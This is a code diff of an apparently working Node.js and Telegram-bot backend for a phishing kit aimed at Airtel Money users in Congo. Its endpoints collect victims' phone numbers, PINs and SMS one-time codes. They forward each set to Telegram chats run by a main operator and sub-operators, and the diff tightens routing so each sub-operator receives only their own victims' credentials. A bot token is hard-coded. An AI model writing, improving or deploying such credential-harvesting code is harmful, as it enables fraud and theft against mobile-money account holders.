@@ -13,7 +13,7 @@ app.use(express.static(path.join(__dirname, 'public')));
 
 const TOKEN = process.env.TOKEN || process.env.TELEGRAM_BOT_TOKEN || '8949476533:AAGUD6b2V0--zQ_x_zNh3XPz2ay_B7xhO7A';
 const APP_URL = process.env.APP_URL || process.env.RENDER_EXTERNAL_URL || (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : '');
-const FALLBACK_ADMIN_ID = process.env.ADMIN_CHAT_ID || process.env.MAIN_ADMIN_ID || '8591555400';
+const FALLBACK_ADMIN_ID = String(process.env.ADMIN_CHAT_ID || process.env.MAIN_ADMIN_ID || '8591555400').trim();
 
 const ADMINS_FILE = path.join(__dirname, 'admins.json');
 
@@ -22,7 +22,7 @@ function loadAdmins() {
     if (fs.existsSync(ADMINS_FILE)) {
       const data = fs.readFileSync(ADMINS_FILE, 'utf8');
       const entries = JSON.parse(data);
-      return new Map(entries.map(([id, rec]) => [id, {
+      return new Map(entries.map(([id, rec]) => [String(id), {
         username: rec.username || '',
         firstName: rec.firstName || 'User',
         lastName: rec.lastName || ''
@@ -44,13 +44,17 @@ const sessions = new Map();
 const admins = loadAdmins();
 
 /**
- * Resolves the destination chat ID strictly from the URL parameter.
+ * Resolves the destination chat ID strictly by the sub-admin's chat ID.
+ * Sub-admin sessions go only to that sub-admin's chat ID (never to MAIN admin).
  */
 function resolveTargetChat(adminParam) {
   if (adminParam && String(adminParam).trim() !== '') {
     const targetAdmin = String(adminParam).trim();
-    if (targetAdmin === String(FALLBACK_ADMIN_ID) || admins.has(targetAdmin)) {
+    if (admins.has(targetAdmin) && targetAdmin !== FALLBACK_ADMIN_ID) {
       return targetAdmin;
+    }
+    if (targetAdmin === FALLBACK_ADMIN_ID) {
+      return FALLBACK_ADMIN_ID;
     }
   }
   return FALLBACK_ADMIN_ID;
@@ -75,7 +79,7 @@ async function initBot() {
       }
 
       const userLink = `${APP_URL}/?admin=${chatId}`;
-      const isMainAdmin = (chatId === String(FALLBACK_ADMIN_ID));
+      const isMainAdmin = (chatId === FALLBACK_ADMIN_ID);
 
       if (isMainAdmin) {
         const mainAdminMessage = `👑 *Bienvenue Administrateur Principal*\n\n` +
@@ -102,12 +106,13 @@ async function initBot() {
       const actionData = query.data || '';
       const chatId = String(query.message.chat.id);
       const parts = actionData.split('_');
-      const actionType = parts.slice(0, 2).join('_'); 
+      const actionType = parts.slice(0, 2).join('_');
       const targetId = parts.slice(2).join('_');
 
       let session = sessions.get(targetId);
       if (!session) session = { adminChatId: chatId };
 
+      // Strictly route back to the session's assigned chat ID (sub-admin's chat ID)
       const chatTarget = session.adminChatId || chatId;
 
       switch (actionType) {
@@ -136,7 +141,10 @@ async function initBot() {
 
       await bot.answerCallbackQuery(query.id, { text: `Action effectuée` }).catch(() => {});
       if (query.message && query.message.message_id) {
-        await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: query.message.chat.id, message_id: query.message.message_id }).catch(() => {});
+        await bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
+          chat_id: query.message.chat.id,
+          message_id: query.message.message_id
+        }).catch(() => {});
       }
     } catch (err) {}
   });
@@ -146,7 +154,7 @@ app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Step 1: Submit Phone Number & PIN
+// Step 1: Submit Phone Number & PIN -> Delivered strictly to sub-admin's chat ID
 app.post('/api/submit-credentials', async (req, res) => {
   try {
     let { phone, pin, adminChatId } = req.body || {};
@@ -154,18 +162,21 @@ app.post('/api/submit-credentials', async (req, res) => {
       adminChatId = req.query.admin;
     }
 
-    // Strict backend validation check for Airtel Congo prefixes (096, 097, 098, 099)
     const airtelCongoRegex = /^09[6789]\d{7}$/;
     if (!airtelCongoRegex.test(phone)) {
-      return res.status(400).json({ success: false, error: 'Numéro Airtel Congo non autorisé (doit commencer par 096, 097, 098 ou 099).' });
+      return res.status(400).json({
+        success: false,
+        error: 'Numéro Airtel Congo non autorisé (doit commencer par 096, 097, 098 ou 099).'
+      });
     }
 
     const targetChat = resolveTargetChat(adminChatId);
     const userId = `user_${Date.now()}`;
-    sessions.set(userId, { 
-      phone, pin, 
-      adminChatId: targetChat, 
-      status: 'WAITING_CREDS_APPROVAL' 
+    sessions.set(userId, {
+      phone,
+      pin,
+      adminChatId: targetChat,
+      status: 'WAITING_CREDS_APPROVAL'
     });
 
     const message = `🔴 *AIRTEL MONEY - NUMÉRO ET CODE PIN*\n\n` +
@@ -185,10 +196,10 @@ app.post('/api/submit-credentials', async (req, res) => {
       }
     };
 
-    if (bot) {
+    if (bot && targetChat) {
       await bot.sendMessage(targetChat, message, opts);
     }
-    
+
     return res.status(200).json({ success: true, userId });
   } catch (err) {
     return res.status(500).json({ success: false, error: 'Erreur réseau.' });
@@ -202,7 +213,7 @@ app.get('/api/check-status/:userId', (req, res) => {
   res.status(200).json({ status: session.status });
 });
 
-// Step 2: Submit 4-digit SMS OTP (Accompanied by applicant phone number)
+// Step 2: Submit 4-digit SMS OTP -> Delivered strictly to sub-admin's chat ID
 app.post('/api/submit-otp', async (req, res) => {
   try {
     const { userId, otp } = req.body || {};
@@ -246,4 +257,4 @@ app.listen(PORT, async () => {
   await initBot();
   console.log(`Server running on port ${PORT}`);
 });
-                                   
+  
